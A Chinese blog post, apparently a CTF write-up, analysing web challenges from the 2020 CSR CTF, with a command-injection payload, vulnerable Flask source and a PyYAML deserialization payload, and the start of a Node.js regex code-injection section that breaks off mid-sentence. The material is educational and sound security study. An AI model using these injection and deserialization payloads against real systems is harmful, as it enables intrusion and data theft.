<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"landvsec.top",root:"/",scheme:"Gemini",version:"7.7.2",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="本文由landvsec原创发布来源于合天智汇公众号 2020-CSR-CTF-Web-复盘以及分析 (qq.com)            前言合天投稿成功的第一篇文章，迟了足足半月发布，想想也是最后一篇文章了 :-) 2020 年 10 月 31 日万圣节举办的德国比赛，界面很有特色，web 题目质量很高，结束后通通复盘了一遍深入理解。题目从易到难一共有十道，其中九道有"><meta property="og:type" content="article"><meta property="og:title" content="2020 CSR CTF Web 部分复盘"><meta property="og:url" content="https://landvsec.top/archives/672c7ef3.html"><meta property="og:site_name" content="My Pureland"><meta property="og:description" content="本文由landvsec原创发布来源于合天智汇公众号 2020-CSR-CTF-Web-复盘以及分析 (qq.com)            前言合天投稿成功的第一篇文章，迟了足足半月发布，想想也是最后一篇文章了 :-) 2020 年 10 月 31 日万圣节举办的德国比赛，界面很有特色，web 题目质量很高，结束后通通复盘了一遍深入理解。题目从易到难一共有十道，其中九道有"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://i.loli.net/2020/11/08/JIvW62ukw5maPjz.png"><meta property="og:image" content="https://i.loli.net/2020/11/04/ZBT2En89GYMr3xL.png"><meta property="og:image" content="https://i.loli.net/2020/11/05/57HmRA2rOlEtdZX.png"><meta property="og:image" content="https://i.loli.net/2020/11/05/ApzDUV5GKyWorPk.png"><meta property="og:image" content="https://i.loli.net/2020/11/08/RDK2VCa1BehjSW9.png"><meta property="og:image" content="https://i.loli.net/2020/11/08/Z4QoM6rsiFRHuXv.png"><meta property="og:image" content="https://i.loli.net/2020/11/08/UcCQp2X63lGiHgd.png"><meta property="og:image" content="https://i.loli.net/2020/11/08/6tsAZ8N5zFG1wEL.png"><meta property="og:image" content="https://i.loli.net/2020/11/09/a5coXiYIzQEv1rJ.png"><meta property="og:image" content="https://i.loli.net/2020/11/10/LlIxroiJBM6fkeU.png"><meta property="og:image" content="https://i.loli.net/2020/11/10/mvXjxQCEotKl1B9.png"><meta property="article:published_time" content="2020-11-08T07:37:20.000Z"><meta property="article:modified_time" content="2020-12-05T13:18:44.279Z"><meta property="article:author" content="landvsec"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://i.loli.net/2020/11/08/JIvW62ukw5maPjz.png"><link rel="canonical" href="https://landvsec.top/archives/672c7ef3.html"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0}</script><title>2020 CSR CTF Web 部分复盘 | My Pureland</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="alternate" href="/atom.xml" title="My Pureland" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">My Pureland</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="site-search"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"></div></div><div class="search-pop-overlay"></div></div></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://landvsec.top/archives/672c7ef3.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/landv.jpg"><meta itemprop="name" content="landvsec"><meta itemprop="description" content="困于山中，被鬼追逐。"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="My Pureland"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2020 CSR CTF Web 部分复盘</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-11-08 15:37:20" itemprop="dateCreated datePublished" datetime="2020-11-08T15:37:20+08:00">2020-11-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-12-05 21:18:44" itemprop="dateModified" datetime="2020-12-05T21:18:44+08:00">2020-12-05</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a> </span></span><span id="/archives/672c7ef3.html" class="post-meta-item leancloud_visitors" data-flag-title="2020 CSR CTF Web 部分复盘" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/archives/672c7ef3.html#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/archives/672c7ef3.html" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>15k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>14 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><div class="note info"><p>本文由<strong>landvsec</strong>原创发布</p><p>来源于合天智汇公众号 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/ICMlGC9ZZMStfRLF0Yl4xg">2020-CSR-CTF-Web-复盘以及分析 (qq.com)</a></p></div><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>合天投稿成功的第一篇文章，迟了足足半月发布，想想也是最后一篇文章了 :-)</p><p>2020 年 10 月 31 日万圣节举办的德国比赛，界面很有特色，web 题目质量很高，结束后通通复盘了一遍深入理解。题目从易到难一共有十道，其中九道有出，本篇只详细分析解数多的五道。</p><p>本篇相关亮点：</p><ul><li>Python yaml 反序列化</li><li>Node.JS RCE</li><li>NoSQL 盲注</li></ul><a id="more"></a><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="Cyberwall"><a href="#Cyberwall" class="headerlink" title="Cyberwall"></a>Cyberwall</h2><p>开胃小菜。</p><p>网页源码有密码可登入。</p><p>路由 debug 命令注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/08/JIvW62ukw5maPjz.png" style="zoom:80%"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat super_secret_data.txt</span><br></pre></td></tr></table></figure><h2 id="Wheels-n-Whales"><a href="#Wheels-n-Whales" class="headerlink" title="Wheels n Whales"></a>Wheels n Whales</h2><p>给了源码</p><p>web.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect, Flask, render_template, request, abort</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, send_from_directory, make_response, Response</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">EASTER_WHALE = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;TheBestWhaleIsAWhaleEveryOneLikes&quot;</span>, <span class="string">&quot;image_num&quot;</span>: <span class="number">2</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">34</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html.jinja&quot;</span>, active=<span class="string">&quot;home&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Whale</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, image_num, weight</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.image_num = image_num</span><br><span class="line">        self.weight = weight</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> yaml.dump(self.__dict__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/whale&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whale</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">        <span class="comment"># 长度限制 10</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">10</span>: </span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;Name to long. Whales can only understand names up to 10 chars&quot;</span>, <span class="number">400</span>)</span><br><span class="line">        image_num = request.form[<span class="string">&quot;image_num&quot;</span>]</span><br><span class="line">        weight = request.form[<span class="string">&quot;weight&quot;</span>]</span><br><span class="line">        whale = Whale(name, image_num, weight)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># getflag 注意这里</span></span><br><span class="line">        <span class="keyword">if</span> whale.__dict__ == EASTER_WHALE:</span><br><span class="line">            <span class="keyword">return</span> make_response(flag.get_flag(), <span class="number">200</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;whale.html.jinja&quot;</span>, w=whale, active=<span class="string">&quot;whale&quot;</span>), <span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;whale_builder.html.jinja&quot;</span>, active=<span class="string">&quot;whale&quot;</span>), <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wheel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, image_num, diameter</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.image_num = image_num</span><br><span class="line">        self.diameter = diameter</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_configuration</span>(<span class="params">config</span>):</span></span><br><span class="line">        <span class="keyword">return</span> Wheel(**yaml.load(config, Loader=yaml.Loader))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> yaml.dump(self.__dict__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/wheel&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wheel</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;config&quot;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">            wheel = Wheel.from_configuration(request.form[<span class="string">&quot;config&quot;</span>])</span><br><span class="line">            <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel.html.jinja&quot;</span>, w=wheel, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br><span class="line">        name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">        image_num = request.form[<span class="string">&quot;image_num&quot;</span>]</span><br><span class="line">        diameter = request.form[<span class="string">&quot;diameter&quot;</span>]</span><br><span class="line">        wheel = Wheel(name, image_num, diameter)</span><br><span class="line">        print(wheel.dump())</span><br><span class="line">        <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel.html.jinja&quot;</span>, w=wheel, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel_builder.html.jinja&quot;</span>, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flask 框架，yaml 序列化。</p><p>整体逻辑很简单，wheel 和 whale 两个类，whale 需要我们创建属性值与 <code>EASTER_WHALE</code> 相同的类对象，但 name 属性明显过不了 if ，长度限制 10 。</p><p>wheel 就没有这么多限制，而且我们注意到，除了用构造函数创建 wheel 实例外，还有这段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wheel</span>:</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_configuration</span>(<span class="params">config</span>):</span></span><br><span class="line">        <span class="keyword">return</span> Wheel(**yaml.load(config, Loader=yaml.Loader))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> yaml.dump(self.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/wheel&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wheel</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;config&quot;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">            wheel = Wheel.from_configuration(request.form[<span class="string">&quot;config&quot;</span>])</span><br><span class="line">            <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel.html.jinja&quot;</span>, w=wheel, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br></pre></td></tr></table></figure><p>我们结合 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://pyyaml.org/wiki/PyYAMLDocumentation">Pyyaml 官方文档</a> 来理解一下上述代码做了什么，有何利用点：</p><blockquote><p><code>yaml.dump(data, Dumper=Dumper)</code></p><p><code>yaml.dump</code> 函数接受一个 Python 对象并生成一个 YAML 文档。</p><p><code>yaml.load(stream, Loader=Loader)</code></p><p><code>yaml.load</code> 函数将 YAML 文档转换为 Python 对象，返回一个 Python 对象。</p><p><code>yaml.load</code> 接受一个字节字符串、一个 Unicode 字符串、一个打开的二进制文件对象或一个打开的文本文件对象。字节字符串或文件必须使用 utf-8、 utf-16-be 或 utf-16-le 编码进行编码。<code>yaml.load</code> 通过检查字符串/文件开头的 BOM (字节顺序标记) 序列来检测编码。如果没有提供 BOM，则假定采用 utf-8编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(<span class="string">u&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>hello: Привет!</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&quot;&quot;&quot;</span>)    <span class="comment"># In Python 3, do not use the &#x27;u&#x27; prefix</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;hello&#x27;</span>: <span class="string">u&#x27;\u041f\u0440\u0438\u0432\u0435\u0442!&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stream = file(<span class="string">&#x27;document.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)    <span class="comment"># &#x27;document.yaml&#x27; contains a single YAML document.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(stream)</span><br><span class="line">[...]    <span class="comment"># A Python object corresponding to the document.</span></span><br></pre></td></tr></table></figure><p>对于这个函数，官方也有警告：</p><p>用从不可信来源接收的任何数据调用 <code>yaml.load</code> 是不安全的！<code>yaml.load</code> 和 <code>pickle.load</code> 一样强大，因此<strong>可以调用任何 Python 函数</strong>。</p><p>既然 <code>yaml.load</code> 可以调用任何 Python 函数，那我们可以不用想办法创建 whale 去使之与 <code>EASTER_WHALE</code> 相等，直接 <code>flag.get_flag()</code> 即可。</p><p>结合题目代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_configuration</span>(<span class="params">config</span>):</span></span><br><span class="line">  <span class="keyword">return</span> Wheel(**yaml.load(config, Loader=yaml.Loader))</span><br></pre></td></tr></table></figure><p>这里的 <code>yaml.load</code> 从 config 中读取 yaml 文件创建 wheel 对象，加上 <code>Loader=yaml.Loader</code> 只是为了避免警告。</p><p>而 config 则是来自我们 post 的表单数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;config&quot;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">      wheel = Wheel.from_configuration(request.form[<span class="string">&quot;config&quot;</span>])</span><br></pre></td></tr></table></figure><p>到这里思路就很明晰了，我们从路由 wheel post config 对象，config 的 name 用我们精心构造的可以 <code>flag.get_flag()</code> 的语句，其他参数因为是数字类型所以随便写即可。</p></blockquote><p>我们先要想办法序列化一个对象传入 <code>yaml.load</code> ，而对应官方文档有：</p><blockquote><p><code>!!python/object:module.Class &#123; attribute: value, ... &#125;</code></p><p>任何可选对象都可以使用 <code>!!python/object</code> 进行序列化。</p><p>为了支持 pickle 协议，还提供了两种额外形式。</p><p><code>!!python/object/new:module.Class [argument, ...]</code></p><p><code>!!python/object/apply:module.function [argument, ...]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Hero</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, hp, sp</span>):</span></span><br><span class="line"><span class="meta">... </span>        self.name = name</span><br><span class="line"><span class="meta">... </span>        self.hp = hp</span><br><span class="line"><span class="meta">... </span>        self.sp = sp</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="string">&quot;%s(name=%r, hp=%r, sp=%r)&quot;</span> % (</span><br><span class="line"><span class="meta">... </span>            self.__class__.__name__, self.name, self.hp, self.sp)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>!!python/object:__main__.Hero</span></span><br><span class="line"><span class="string"><span class="meta">... </span>name: Welthyr Syxgon</span></span><br><span class="line"><span class="string"><span class="meta">... </span>hp: 1200</span></span><br><span class="line"><span class="string"><span class="meta">... </span>sp: 0</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">Hero(name=<span class="string">&#x27;Welthyr Syxgon&#x27;</span>, hp=<span class="number">1200</span>, sp=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>如上例，Hero 类有三个属性 name、hp、sp ，我们可以通过 <code>!!python/object</code> 利用 <code>yaml.load</code> 成功序列化出来。</p></blockquote><p>所以我们可以构造 payload 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config&#x3D;&#123;name: !!python&#x2F;object&#x2F;apply:flag.get_flag [], image_num: 3, diameter: 3&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/04/ZBT2En89GYMr3xL.png"></p><h2 id="CSRegex"><a href="#CSRegex" class="headerlink" title="CSRegex"></a>CSRegex</h2><p>页面是正则表达式测试工具。</p><p>nodejs 笔者没有相关开发经验，写的可能有所欠缺，所以下文仅作为参考。</p><p><img src="https://i.loli.net/2020/11/05/57HmRA2rOlEtdZX.png" style="zoom:67%"></p><p>我们应首先判断这个网站是用什么写的，当然 ctf 首先想到的是 node ，这种类似的题在 picoCTF见过，这里摆出来只是为了介绍一下，判断 node 简便的方法有两种：</p><ul><li>当访问一个不存在的路径时，会得到 node 错误 “ Can not GET/whatever” ，响应头部有 <code>X-Powered-By: Express</code> （ Express 框架开发）</li><li>利用 <code>Wappalyzer</code> 之类的插件了解网站所用技术</li></ul><p>但明显不能用到这里：</p><p><img src="https://i.loli.net/2020/11/05/ApzDUV5GKyWorPk.png" style="zoom:80%"></p><p>作为第二种方式的代替，我比赛时找到了 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://builtwith.com/">https://builtwith.com/</a></p><p>发现了 underscore.js ，nodejs 库。</p><p>同时 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/tHoMaStHeThErMoNuClEaRbOmB/ctfwriteups/blob/master/CyberSecurityRumblectf/web/CSRegex/README.md#solution">国外师傅</a> 是利用 <code>fetch</code> 是否定义来判断该网站是运行在 node 上还是浏览器上的：</p><blockquote><p>“fetch is not defined” — we are running on node and not a web browser</p></blockquote><p>通过观察 JavaScript Code ，我们可以先闭合掉前面的正则表达式，试着拼接一些命令来获取更多信息，最后再注释掉：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line">\w/gi);<span class="keyword">let</span> a=<span class="number">10</span>;<span class="keyword">return</span> a;/</span><br><span class="line">------</span><br><span class="line"><span class="string">&#x27;123&#x27;</span>.match(<span class="regexp">/\w/gi</span>);<span class="keyword">let</span> a=<span class="number">10</span>;<span class="keyword">return</span> a;<span class="comment">//gi)</span></span><br><span class="line">------</span><br><span class="line">&#123; <span class="string">&quot;result&quot;</span>: <span class="number">10</span> &#125;</span><br></pre></td></tr></table></figure><p>既然有了 RCE ，我们先来考虑读系统文件该怎么构造 payload ，node 有 fs 模块用于对系统文件及目录进行读写操作，需要用 <code>require(&#39;fs&#39;)</code> 来载入，但<strong>上下文</strong>里不一定有 <code>require</code> ，<code>require</code> 并不是可以全局访问的。</p><p>见 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://nodejs.org/api/globals.html#globals_require">官方文档</a> 和 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://runkit.com/phith0n/5dc0f2cb6866bd0013b764c5">示例</a> ：</p><blockquote><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://nodejs.org/api/globals.html#globals_require">require()</a></p><p>This variable may appear to be global <strong>but is not</strong>. See <a target="_blank" rel="noopener external nofollow noreferrer" 